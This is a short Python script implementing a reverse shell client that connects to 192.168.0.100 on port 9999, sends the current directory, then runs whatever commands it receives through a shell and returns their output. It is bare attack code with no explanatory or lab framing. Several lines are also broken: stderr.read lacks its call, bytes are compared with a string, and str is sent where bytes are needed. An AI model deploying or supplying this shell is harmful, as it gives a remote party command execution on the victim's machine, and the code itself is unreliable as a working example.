import socket
import os 
import subprocess
def shell():
    current_dir=bytes(os.getcwd(), encoding = "utf-8")
    client.send(current_dir)
    while True:
        ans=client.recv(1024)
        if ans== "exit":
            break
        else:
            proc=subprocess.Popen(ans, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result=str(proc.stdout.read()+ proc.stderr.read)
            client.send(result)
        client.send("hola mundo")
client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.0.100',9999))
shell()
client.close
